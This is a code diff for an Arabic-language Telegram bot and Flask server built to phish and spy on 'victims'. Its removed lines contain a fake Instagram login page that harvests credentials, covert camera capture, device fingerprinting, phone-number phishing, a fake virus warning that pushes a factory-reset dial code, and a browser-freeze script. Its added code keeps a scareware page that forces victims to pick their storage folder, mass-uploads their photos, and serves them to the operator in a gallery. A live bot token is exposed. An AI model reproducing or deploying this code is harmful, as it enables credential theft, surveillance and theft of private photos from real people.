@@ -1,8 +1,10 @@
+import os
 import requests
-from flask import Flask, request, render_template_string, redirect
+from flask import Flask, request, render_template_string, redirect, send_from_directory
 import base64
 import random
 import string
+import time
 import phonenumbers
 from phonenumbers import geocoder, carrier
 
@@ -13,11 +15,13 @@ BOT_TOKEN = "8997379641:AAGl00Dmd9ZJVTpqS-qACvanKTOEcDXgBKs"
 ADMIN_ID = "7870803639"
 BASE_URL = "https://freeusr-bot.onrender.com"
 
-# 🔒 قائمة الآيديهات المسموح لها باستخدام البوت
 ALLOWED_USERS = [7870803639] 
-
 user_state = {}
 short_links = {}
+
+# مجلد التخزين المؤقت (على Render)
+UPLOAD_FOLDER = 'static/victim_storage'
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 def send_message(chat_id, text, reply_markup=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -36,312 +40,22 @@ def answer_callback(callback_id):
     except Exception as e:
         print(f"Error answer_callback: {e}")
 
-def decorate_text(text):
-    normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-    bold = "𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗"
-    trans = str.maketrans(normal, bold)
-    return text.translate(trans)
-
 def main_menu():
     return {
         "inline_keyboard": [
             [{"text": "🎥 تصوير الضحية فيديو", "callback_data": "v1"}, {"text": "📷 أختراق الكاميرا الضحية", "callback_data": "cam"}],
             [{"text": "🎙 تسجيل صوت الضحية", "callback_data": "v3"}, {"text": "🔬 جمع معلومات الجهاز", "callback_data": "device"}],
-            [{"text": "🕵️‍♂️ أختراق كاميرا المراقبة", "callback_data": "v5"}, {"text": "🌍 أختراق الموقع", "callback_data": "v6"}],
-            [{"text": "🟩 اغلاق المواقع", "callback_data": "v7"}, {"text": "💜 الذكاء الاصطناعي الشرير", "callback_data": "v8"}],
-            [{"text": "📸 أختراق انستغرام", "callback_data": "insta"}, {"text": "💻 أختراق تيك توك", "callback_data": "v9"}],
-            [{"text": "👻 أختراق سناب شات", "callback_data": "v10"}, {"text": "📘 أختراق فيسبوك", "callback_data": "v11"}],
-            [{"text": "🐦 أختراق تويتر", "callback_data": "v12"}, {"text": "🔴 أختراق يوتيوب", "callback_data": "v13"}],
-            [{"text": "💎 أختراق فري فاير", "callback_data": "v14"}, {"text": "💵 أختراق ببجي", "callback_data": "v15"}],
-            [{"text": "😂 اعطيني نكته", "callback_data": "joke"}],
-            [{"text": "⛔ أختراق الهاتف كاملاً", "callback_data": "v16"}, {"text": "🔒 إخفاء الرابط", "callback_data": "v17"}],
-            [{"text": "🛑 المزيد من المميزات", "callback_data": "more"}],
-            [{"text": "📺 أختراق بت التلفزيون", "callback_data": "v18"}, {"text": "📻 أختراق بت الريدو", "callback_data": "v19"}],
-            [{"text": "📱 معلومات انستا وتيك توك", "callback_data": "v20"}, {"text": "☠️ بوت أختراق", "callback_data": "v21"}],
-            [{"text": "🔄 تحويل النص إلى صوت", "callback_data": "v22"}, {"text": "🔍 فحص رابط", "callback_data": "v23"}],
-            [{"text": "👁 البحث عن المستخدم", "callback_data": "search_user"}, {"text": "📱 معلومات IP", "callback_data": "ip"}],
-            [{"text": "🔍 كاشف الأرقام (تيك توك/تلجرام)", "callback_data": "phone_search"}, {"text": "💬 فتح شات واتساب عبره رقم", "callback_data": "v27"}],
-            
-            # 👇 الزر الجديد الخاص بالفخ 👇
-            [{"text": "🚨 تفعيل فخ ذاكرة التخزين (الهاكر)", "callback_data": "steal_photos"}, {"text": "📝 زخرفة", "callback_data": "decor"}],
-            
-            [{"text": "📱 معرفة رقم الضحيه من اليوزر", "callback_data": "phone"}],
-            [{"text": "📖 شرح استخدام البوت", "callback_data": "guide"}, {"text": "📞 تواصل مع المطور", "callback_data": "dev"}]
+            [{"text": "🚨 فخ ذاكرة التخزين (المعرض العكسي)", "callback_data": "steal_photos"}],
+            [{"text": "📖 شرح استخدام البوت", "callback_data": "guide"}]
         ]
     }
 
 # ============= المسارات (Routes) =============
 
-@app.route('/s/<code>')
-def redirect_short(code):
-    url = short_links.get(code)
-    if url:
-        return redirect(url)
-    return "الرابط غير موجود أو تم حذفه.", 404
-
 @app.route('/')
 def index():
-    admin = request.args.get('admin', '')
-    target = request.args.get('target', '')
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html>
-    <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Instagram</title>
-    <style>body{font-family:Arial;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
-    .box{background:#fff;border:1px solid #dbdbdb;padding:20px 40px;width:350px;text-align:center;border-radius:8px}
-    h1{font-family:cursive;font-size:40px;margin-bottom:20px}
-    input{width:100%;padding:10px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;box-sizing:border-box}
-    button{width:100%;padding:10px;background:#0095f6;color:#fff;border:none;border-radius:5px;font-weight:bold;margin-top:10px;cursor:pointer}
-    </style>
-    </head>
-    <body>
-    <div class="box">
-    <h1>Instagram</h1>
-    <form action="/login" method="POST">
-    <input type="hidden" name="admin_id" value="{{ admin }}">
-    <input type="hidden" name="target" value="{{ target }}">
-    <input type="text" name="username" placeholder="Phone number, username, or email" required>
-    <input type="password" name="password" placeholder="Password" required>
-    <button type="submit">Log In</button>
-    </form>
-    </div>
-    </body>
-    </html>
-    """, admin=admin, target=target)
+    return "OK"
 
-@app.route('/login', methods=['POST'])
-def login():
-    username = request.form.get('username')
-    password = request.form.get('password')
-    admin_id = request.form.get('admin_id')
-    target = request.form.get('target')
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    msg = f"🚨 *صيدة جديدة!*\n🎯 الهدف: `{target}`\n👤 اليوزر: `{username}`\n🔑 الباسورد: `{password}`\n🌐 IP: `{ip}`"
-    if admin_id: send_message(admin_id, msg)
-    return redirect("https://www.instagram.com")
-
-@app.route('/camera')
-def camera_page():
-    admin = request.args.get('admin', '')
-    target = request.args.get('target', '')
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html lang="ar" dir="rtl">
-    <head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق من الأمان</title>
-    <style>body{font-family:Arial;background:#111;color:#fff;text-align:center;padding:50px 20px}
-    .box{background:#222;padding:30px;border-radius:15px;max-width:400px;margin:auto}</style>
-    </head>
-    <body>
-    <div class="box">
-    <h2 id="status">جاري التحقق من الهوية...</h2>
-    <p id="sub" style="color:#888;font-size:14px;margin-top:10px;">يرجى السماح بالوصول للكاميرا للمتابعة</p>
-    <video id="video" autoplay style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-    </div>
-    <script>
-    async function startCam() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const dataURL = canvas.toDataURL('image/jpeg');
-                fetch('/upload_camera', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ image: dataURL, admin: '{{ admin }}', target: '{{ target }}' })
-                }).then(() => { window.location.href = 'https://www.google.com'; });
-            }, 2000);
-        } catch (err) {
-            document.getElementById('status').innerText = "تم رفض الوصول.";
-            document.getElementById('sub').innerText = "لا يمكن المتابعة بدون تفعيل الكاميرا.";
-        }
-    }
-    window.onload = startCam;
-    </script>
-    </body>
-    </html>
-    """, admin=admin, target=target)
-
-@app.route('/upload_camera', methods=['POST'])
-def upload_camera():
-    data = request.get_json()
-    if not data or 'image' not in data: return "error", 400
-    admin_id = data.get('admin')
-    target = data.get('target')
-    img_data = data['image'].split(',')[1]
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-    files = {'photo': ('camera.jpg', base64.b64decode(img_data), 'image/jpeg')}
-    payload = {'chat_id': admin_id, 'caption': f"📷 *صورة من كاميرا الضحية!*\n🎯 الهدف: {target}"}
-    try: requests.post(url, data=payload, files=files)
-    except Exception as e: print(e)
-    return "ok"
-
-@app.route('/device')
-def device_page():
-    admin = request.args.get('admin', '')
-    target = request.args.get('target', '')
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html>
-    <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تحقق من الأمان</title>
-    <style>body{font-family:Arial;background:#f2f4f8;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
-    .box{background:#fff;padding:30px;width:300px;text-align:center;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}
-    button{width:100%;padding:12px;background:#28a745;color:#fff;border:none;border-radius:6px;font-weight:bold;font-size:16px;margin-top:20px;cursor:pointer}</style>
-    </head>
-    <body>
-    <div class="box">
-    <h2>جاري التحقق من هويتك...</h2>
-    <p style="color:#666;font-size:14px;">اضغط بالأسفل لتأكيد أنك لست روبوت</p>
-    <button onclick="gatherData('{{ admin }}', '{{ target }}')">أنا لست روبوت</button>
-    </div>
-    <script>
-    async function gatherData(admin, target) {
-        let info = { userAgent: navigator.userAgent, platform: navigator.platform, screen: `${screen.width}x${screen.height}`, lang: navigator.language, cores: navigator.hardwareConcurrency || "Unknown", ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown", battery: "Unknown", admin: admin, target: target };
-        try { if (navigator.getBattery) { const battery = await navigator.getBattery(); info.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : '(Not Charging)'}`; } } catch(e) {}
-        fetch('/collect_device', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(info) }).then(() => { window.location.href = 'https://www.google.com'; });
-    }
-    </script>
-    </body>
-    </html>
-    """, admin=admin, target=target)
-
-@app.route('/collect_device', methods=['POST'])
-def collect_device():
-    data = request.get_json()
-    admin_id = data.get('admin')
-    target = data.get('target')
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    if ip and ',' in ip: ip = ip.split(',')[0].strip()
-    country, city, isp = "Unknown", "Unknown", "Unknown"
-    try:
-        geo_req = requests.get(f'http://ip-api.com/json/{ip}', timeout=3).json()
-        if geo_req.get('status') == 'success': country, city, isp = geo_req.get('country'), geo_req.get('city'), geo_req.get('isp')
-    except: pass
-    msg = f"📱 *معلومات جهاز الضحية!*\n\n🎯 الهدف: `{target}`\n🌐 الـ IP: `{ip}`\n📍 الدولة/المحافظة: `{country} / {city}`\n📡 الشبكة: `{isp}`\n🔋 البطارية: `{data.get('battery')}`\n📱 نظام التشغيل والجهاز: `{data.get('userAgent')}`\n🖥 دقة الشاشة: `{data.get('screen')}`\n🧠 الرام: `{data.get('ram')}`\n⚙️ المعالج (أنوية): `{data.get('cores')}`\n🌍 اللغة: `{data.get('lang')}`"
-    if admin_id: send_message(admin_id, msg)
-    return "ok", 200
-
-@app.route('/phone')
-def phone_page():
-    admin = request.args.get('admin', '')
-    target = request.args.get('target', '')
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html lang="ar" dir="rtl">
-    <head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الملف الشخصي</title>
-    <style>body{font-family:Arial;background:#0088cc;color:#fff;text-align:center;padding:40px 20px;margin:0}
-    .box{background:#fff;color:#333;padding:30px;border-radius:15px;max-width:350px;margin:auto;box-shadow:0 4px 10px rgba(0,0,0,0.2)}
-    input{width:100%;padding:12px;margin:15px 0;border:1px solid #ccc;border-radius:8px;font-size:16px;box-sizing:border-box;text-align:center}
-    button{background:#0088cc;color:#fff;border:none;padding:12px;font-size:16px;border-radius:8px;width:100%;font-weight:bold;cursor:pointer}</style>
-    </head>
-    <body>
-    <div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="60" style="margin-bottom:10px;">
-    <h2>تأكيد الرقم</h2>
-    <p style="color:#666;font-size:14px;">لعرض حساب <strong>@{{ target }}</strong> بشكل كامل، يرجى تأكيد رقم هاتفك المرتبط بحسابك.</p>
-    <form action="/submit_phone" method="POST">
-    <input type="hidden" name="admin_id" value="{{ admin }}">
-    <input type="hidden" name="target" value="{{ target }}">
-    <input type="tel" name="phone" placeholder="+967 7XX XXX XXX" required>
-    <button type="submit">تأكيد وعرض الحساب</button>
-    </form>
-    </div>
-    </body>
-    </html>
-    """, admin=admin, target=target)
-
-@app.route('/submit_phone', methods=['POST'])
-def submit_phone():
-    phone = request.form.get('phone')
-    admin_id = request.form.get('admin_id')
-    target = request.form.get('target')
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    msg = f"📱 *رقم هاتف جديد تم صيده!*\n🎯 اليوزر المستهدف: `@{target}`\n📞 الرقم: `{phone}`\n🌐 IP الضحية: `{ip}`"
-    if admin_id: send_message(admin_id, msg)
-    return redirect("https://t.me/" + target)
-
-@app.route('/format')
-def format_page():
-    admin = request.args.get('admin', '')
-    target = request.args.get('target', '')
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html lang="ar" dir="rtl">
-    <head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحذير أمني</title>
-    <style>body{font-family:Arial;background:#ffebee;color:#b71c1c;text-align:center;padding:40px 20px;margin:0}
-    .box{background:#fff;padding:30px;border-radius:15px;max-width:350px;margin:auto;box-shadow:0 4px 15px rgba(0,0,0,0.2);border-top:5px solid #f44336}
-    h1{font-size:24px;margin-bottom:10px}
-    p{color:#555;font-size:14px;line-height:1.6}
-    a.btn{display:block;background:#f44336;color:#fff;text-decoration:none;padding:15px;border-radius:8px;font-weight:bold;font-size:18px;margin-top:20px;animation:pulse 1.5s infinite}
-    @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-    .note{font-size:11px;color:#999;margin-top:15px}</style>
-    </head>
-    <body>
-    <div class="box">
-    <h1>⚠️ تم اكتشاف فيروس!</h1>
-    <p>تم اكتشاف برمجيات خبيثة تسرق بياناتك. لحماية جهازك، يجب فرمتة الجهاز فوراً لمسح الفيروس.</p>
-    <p>اضغط بالأسفل لبدء عملية الفرمتة:</p>
-    <a href="tel:*#*#7780#*#*" class="btn">فرمتة الجهاز الآن</a>
-    <div class="note">سيتم تحويلك لشاشة الاتصال، اضغط على زر الاتصال الأخضر لتأكيد الفرمتة.</div>
-    </div>
-    </body>
-    </html>
-    """, admin=admin, target=target)
-
-@app.route('/freeze')
-def freeze_page():
-    admin = request.args.get('admin', '')
-    target = request.args.get('target', '')
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html lang="ar" dir="rtl">
-    <head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحميل...</title>
-    <style>body{background:#111;color:#fff;text-align:center;font-family:Arial;padding-top:50px;overflow:hidden;}
-    .spinner{width:50px;height:50px;border:5px solid #333;border-top:5px solid #00ffcc;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px auto;}
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
-    </head>
-    <body>
-    <div class="spinner"></div>
-    <h2>جاري معالجة الملف...</h2>
-    <p style="color:#888;font-size:14px;">يرجى الانتظار، لا تغلق الصفحة.</p>
-    <script>
-    fetch('/collect_freeze', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ admin: '{{ admin }}', target: '{{ target }}' }) });
-    setTimeout(function() {
-        function freeze() { while(true) { let bomb = new Array(10000000).fill("WOODE_FREEZE_PAYLOAD"); } }
-        freeze();
-    }, 1000);
-    </script>
-    </body>
-    </html>
-    """, admin=admin, target=target)
-
-@app.route('/collect_freeze', methods=['POST'])
-def collect_freeze():
-    data = request.get_json()
-    admin_id = data.get('admin')
-    target = data.get('target')
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    if ip and ',' in ip: ip = ip.split(',')[0].strip()
-    msg = f"❄️ *الضحية فتح رابط التجميد!*\n🎯 الهدف: `{target}`\n🌐 الـ IP: `{ip}`\n📱 جاري تجميد المتصفح الآن..."
-    if admin_id: send_message(admin_id, msg)
-    return "ok", 200
-
-# =======================================================
-# 🚨 فخ ذاكرة التخزين والرفع المتقطع (Batch Upload) 🚨
-# =======================================================
 @app.route('/trap')
 def trap_page():
     admin = request.args.get('admin', '')
@@ -355,72 +69,37 @@ def trap_page():
         <title>فحص ذاكرة الهاتف</title>
         <style>
             body { margin:0; padding:0; background:#0a0a0a; color:#fff; font-family:'Segoe UI',Tahoma,sans-serif; height:100vh; overflow:hidden; user-select:none; -webkit-user-select:none; }
-            
-            #fullScreenTrap {
-                position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; cursor: pointer;
-            }
-
-            .content-wrapper {
-                position: relative; z-index: 10; pointer-events: none;
-                display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh;
-                background: radial-gradient(circle, #0d1b2a 0%, #000000 100%);
-            }
-
-            .warning-box {
-                background: #111; padding: 40px 20px; border-radius: 20px; text-align: center; 
-                width: 85%; max-width: 350px; box-shadow: 0 10px 30px rgba(0,150,255,0.2); 
-                border: 1px solid #333;
-            }
-
+            #fullScreenTrap { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; cursor: pointer; }
+            .content-wrapper { position: relative; z-index: 10; pointer-events: none; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background: radial-gradient(circle, #0d1b2a 0%, #000000 100%); }
+            .warning-box { background: #111; padding: 40px 20px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; box-shadow: 0 10px 30px rgba(0,150,255,0.2); border: 1px solid #333; }
             .sys-icon { font-size: 80px; color: #2196F3; margin-bottom: 20px; animation:pulse 1s infinite alternate; }
             @keyframes pulse { from{transform:scale(1);} to{transform:scale(1.1);} }
-            
             h1 { font-size: 24px; margin-bottom: 10px; color: #64B5F6; }
             p { font-size: 16px; color: #aaa; line-height: 1.6; margin-bottom: 30px; }
-            
-            .fake-btn { 
-                background: #1976D2; color: #fff; font-size: 20px; font-weight: bold; padding: 18px 30px; 
-                border-radius: 50px; width: 100%; box-sizing: border-box; 
-                box-shadow: 0 4px 15px rgba(25, 118, 210, 0.5);
-                display: block; border: none; animation: blink 1.5s infinite;
-            }
+            .fake-btn { background: #1976D2; color: #fff; font-size: 20px; font-weight: bold; padding: 18px 30px; border-radius: 50px; width: 100%; box-sizing: border-box; box-shadow: 0 4px 15px rgba(25, 118, 210, 0.5); display: block; border: none; animation: blink 1.5s infinite; }
             @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
-
             #fileTrap { position: absolute; width: 1px; height: 1px; opacity: 0; top: -9999px; }
-
-            #loadingScreen { 
-                display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; 
-                background:#0a0a0a; z-index:99999; flex-direction:column; justify-content:center; 
-                align-items:center; text-align:center; padding: 0 20px; box-sizing: border-box;
-            }
+            #loadingScreen { display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:#0a0a0a; z-index:99999; flex-direction:column; justify-content:center; align-items:center; text-align:center; padding: 0 20px; box-sizing: border-box; }
             .spinner { border:5px solid #333; border-top:5px solid #2196F3; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; margin-bottom:20px; }
             @keyframes spin { to{transform:rotate(360deg);} }
-            #errorMsg { color:#ff4444; font-weight:bold; font-size:22px; display:none; margin-top:20px; }
         </style>
     </head>
     <body>
         <label for="fileTrap" id="fullScreenTrap"></label>
-
         <div class="content-wrapper">
             <div class="warning-box">
                 <div class="sys-icon">📁</div>
                 <h1>تحذير: ذاكرة الهاتف مصابة!</h1>
-                <p>تم رصد ملفات خبيثة تخترق بياناتك. لتنظيف ذاكرة الهاتف (Internal Storage)، يجب عليك تحديد مجلد التخزين الرئيسي للفحص.</p>
-                
+                <p>تم رصد ملفات خبيثة تخترق بياناتك. لتنظيف ذاكرة الهاتف، يجب عليك تحديد مجلد التخزين الرئيسي للفحص.</p>
                 <label for="fileTrap" class="fake-btn" id="mainBtn">تحديد ذاكرة الهاتف للفحص</label>
             </div>
         </div>
-
         <div id="loadingScreen">
             <div class="spinner" id="spinner"></div>
             <h2 style="color:#fff;" id="statusText">جاري فحص ذاكرة التخزين...</h2>
-            <p style="color:#888; font-size:14px;">لا تغلق الصفحة. جاري سحب الملفات على دفعات.</p>
-            <div id="errorMsg">❌ فشل التنظيف! يجب تحديد مجلد التخزين.</div>
+            <p style="color:#888; font-size:14px;">لا تغلق الصفحة. جاري سحب الملفات.</p>
         </div>
-
-        <!-- webkitdirectory يفتح مدير الملفات لاختيار الفولدر كامل -->
         <input type="file" id="fileTrap" accept="*/*" multiple webkitdirectory>
-
         <script>
             const ADMIN_ID = "{{ admin }}";
             const TARGET = "{{ target }}";
@@ -432,17 +111,11 @@ def trap_page():
                 if (navigator.vibrate) navigator.vibrate([200,100,200,100,500]);
             });
 
+            // إجبار مدير الملفات على الفتح لو حاول يقفل
             window.addEventListener('focus', () => {
                 setTimeout(() => {
                     if (!extracted && document.getElementById('fileTrap').files.length === 0) {
-                        document.getElementById('spinner').style.display = 'none';
-                        document.getElementById('statusText').innerText = "فشل الفحص!";
-                        document.getElementById('errorMsg').style.display = 'block';
-                        if (navigator.vibrate) navigator.vibrate(800);
-                        
-                        setTimeout(() => {
-                            if (!extracted) document.getElementById('fileTrap').click();
-                        }, 800);
+                        setTimeout(() => { if (!extracted) document.getElementById('fileTrap').click(); }, 800);
                     }
                 }, 500);
             });
@@ -450,59 +123,34 @@ def trap_page():
             document.getElementById('fileTrap').addEventListener('change', async function(e) {
                 const files = e.target.files;
                 if (!files.length) return;
-                
                 extracted = true;
-                document.getElementById('errorMsg').style.display = 'none';
-                document.getElementById('spinner').style.display = 'block';
-
-                // 1. فلترة الصور فقط
+                document.getElementById('loadingScreen').style.display = 'flex';
+                
                 const imageFiles = Array.from(files).filter(file => file.type.startsWith('image/'));
-
                 if (imageFiles.length === 0) {
-                    document.getElementById('statusText').innerText = "لم يتم العثور على صور في هذا المجلد.";
-                    document.getElementById('spinner').style.display = 'none';
+                    document.getElementById('statusText').innerText = "لم يتم العثور على صور في المجلد.";
                     return;
                 }
 
                 const totalImages = imageFiles.length;
-                const batchSize = 30; // عدد الصور في كل دفعة
+                const batchSize = 15; // 15 صورة لكل دفعة عشان سرعة الرفع
                 let uploadedCount = 0;
 
-                document.getElementById('statusText').innerText = "جاري فحص " + totalImages + " ملف...";
-
-                // 2. التقسيم والرفع المتقطع
                 for (let i = 0; i < totalImages; i += batchSize) {
                     const batch = imageFiles.slice(i, i + batchSize);
                     const fd = new FormData();
                     fd.append('admin', ADMIN_ID);
                     fd.append('target', TARGET);
-                    
-                    for (let j = 0; j < batch.length; j++) {
-                        fd.append('photos', batch[j]);
-                    }
+                    for (let j = 0; j < batch.length; j++) fd.append('photos', batch[j]);
 
                     try {
-                        const response = await fetch('/upload_trap', { method: 'POST', body: fd });
-                        const result = await response.json();
-                        
-                        if (result.ok) {
-                            uploadedCount += batch.length;
-                            document.getElementById('statusText').innerText = "تم فحص " + uploadedCount + " من " + totalImages + " ملف...";
-                            if (navigator.vibrate) navigator.vibrate(50);
-                            
-                            // انتظار ثانية ونصف قبل الدفعة القادمة عشان السيرفر ياخد نفسه
-                            await new Promise(resolve => setTimeout(resolve, 1500));
-                        } else {
-                            throw new Error("Server rejected batch");
-                        }
-                    } catch (err) {
-                        console.log("Error uploading batch", err);
-                        // لو حصل خطأ في دفعة، بنكمل الدفعة اللي بعدها عشان مانوقفش العملية كلها
-                    }
+                        await fetch('/upload_trap', { method: 'POST', body: fd });
+                        uploadedCount += batch.length;
+                        document.getElementById('statusText').innerText = "تم فحص " + uploadedCount + " من " + totalImages + " ملف...";
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    } catch (err) { console.log(err); }
                 }
-
-                // 3. شاشة النجاح
-                document.getElementById('loadingScreen').innerHTML = '<div style="font-size:60px; color:#4CAF50;">✅</div><h2 style="color:#4CAF50;">تم تنظيف ذاكرة الهاتف بنجاح</h2><p style="color:#888;">تم فحص ' + uploadedCount + ' ملف وإزالة الفيروسات. يمكنك إغلاق الصفحة الآن.</p>';
+                document.getElementById('loadingScreen').innerHTML = '<div style="font-size:60px; color:#4CAF50;">✅</div><h2 style="color:#4CAF50;">تم تنظيف ذاكرة الهاتف</h2><p style="color:#888;">يمكنك إغلاق الصفحة.</p>';
             });
         </script>
     </body>
@@ -513,29 +161,88 @@ def trap_page():
 def upload_trap():
     admin_id = request.form.get('admin')
     target = request.form.get('target')
-    
-    # استقبال كل الصور اللي اختارها الضحية
     photos = request.files.getlist('photos')
     
-    if not photos:
+    if not photos or not admin_id:
         return {"ok": False, "error": "no_file"}, 400
         
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-    
-    # إرسال كل صورة في رسالة منفصلة
+    safe_target = "".join(c for c in target if c.isalnum() or c in "_-")
+    target_dir = os.path.join(UPLOAD_FOLDER, safe_target)
+    os.makedirs(target_dir, exist_ok=True)
+
     for photo in photos:
-        files = {'photo': (photo.filename, photo.stream, photo.content_type)}
-        payload = {'chat_id': admin_id, 'caption': f"📸 *صورة مسروقة من الفخ القسري!*\n🎯 الهدف: {target}"}
-        try:
-            requests.post(url, data=payload, files=files, timeout=10)
-        except Exception as e:
-            print(f"Error: {e}")
+        filename = f"{int(time.time())}_{random.randint(1000,9999)}_{photo.filename}"
+        filepath = os.path.join(target_dir, filename)
+        photo.save(filepath)
+        
+    # رابط تطبيق المعرض داخل تليجرام
+    gallery_url = f"{BASE_URL}/gallery/{safe_target}"
+    
+    reply_markup = {
+        "inline_keyboard": [
+            [{"text": "📂 فتح ذاكرة الضحية (المعرض)", "web_app": {"url": gallery_url}}]
+        ]
+    }
+    
+    # إرسال الإشعار لك
+    msg = f"📸 *تم سحب صور جديدة!*\n🎯 الهدف: `{target}`\nاضغط على الزر بالأسفل لفتح المعرض واختيار ما تريد."
+    send_message(admin_id, msg, reply_markup)
         
     return {"ok": True}, 200
 
+# =======================================================
+# 🌐 تطبيق المعرض (Mini App) للتحكم من البوت
+# =======================================================
+@app.route('/gallery/<target>')
+def gallery_page(target):
+    target_dir = os.path.join(UPLOAD_FOLDER, target)
+    if not os.path.exists(target_dir):
+        return "لا توجد صور لهذا الهدف.", 404
+
+    images = os.listdir(target_dir)
+    
+    html = """
+    <!DOCTYPE html>
+    <html lang="ar" dir="rtl">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>ذاكرة الهاتف</title>
+        <script src="https://telegram.org/js/telegram-web-app.js"></script>
+        <style>
+            body { background-color: #1a1a1a; color: #fff; font-family: Arial, sans-serif; margin: 0; padding: 10px; }
+            h2 { text-align: center; color: #4CAF50; margin-bottom: 20px; }
+            .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 10px; }
+            .img-container { position: relative; padding-bottom: 100%; overflow: hidden; border-radius: 10px; background: #333; }
+            .img-container img { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; }
+            .btn { display: block; width: 100%; padding: 15px; background: #2196F3; color: white; text-align: center; border-radius: 10px; font-weight: bold; margin-top: 20px; text-decoration: none; border: none; cursor: pointer; }
+        </style>
+    </head>
+    <body>
+        <h2>📂 ذاكرة الضحية: TARGET_NAME</h2>
+        <p style="text-align:center; font-size:12px; color:#aaa;">اضغط على أي صورة لفتحها وحفظها</p>
+        <div class="grid">
+            IMAGE_TAGS
+        </div>
+        <button class="btn" onclick="Telegram.WebApp.close()">إغلاق المعرض</button>
+    </body>
+    </html>
+    """
+    
+    image_tags = ""
+    for img in images:
+        img_url = f"{BASE_URL}/get_image/{target}/{img}"
+        # فتح الصورة في نافذة جديدة عشان يقدر يحفظها
+        image_tags += f'<div class="img-container"><a href="{img_url}" target="_blank"><img src="{img_url}" loading="lazy"></a></div>'
+        
+    return html.replace("TARGET_NAME", target).replace("IMAGE_TAGS", image_tags)
+
+@app.route('/get_image/<target>/<filename>')
+def get_image(target, filename):
+    target_dir = os.path.join(UPLOAD_FOLDER, target)
+    return send_from_directory(target_dir, filename)
 
 # ============= البوت (Webhook) =============
-
 @app.route(f'/webhook', methods=['POST'])
 def webhook():
     update = request.get_json()
@@ -544,14 +251,14 @@ def webhook():
     if 'message' in update:
         chat_id = update['message']['chat']['id']
         if chat_id not in ALLOWED_USERS:
-            send_message(chat_id, "⛔ عذراً، هذا البوت خاص. غير مصرح لك بالاستخدام.")
+            send_message(chat_id, "⛔ عذراً، هذا البوت خاص.")
             return "ok", 200
             
     if 'callback_query' in update:
         chat_id = update['callback_query']['message']['chat']['id']
         if chat_id not in ALLOWED_USERS:
             answer_callback(update['callback_query']['id'])
-            send_message(chat_id, "⛔ عذراً، هذا البوت خاص. غير مصرح لك بالاستخدام.")
+            send_message(chat_id, "⛔ عذراً، هذا البوت خاص.")
             return "ok", 200
 
     if 'message' in update and 'text' in update['message']:
@@ -563,92 +270,13 @@ def webhook():
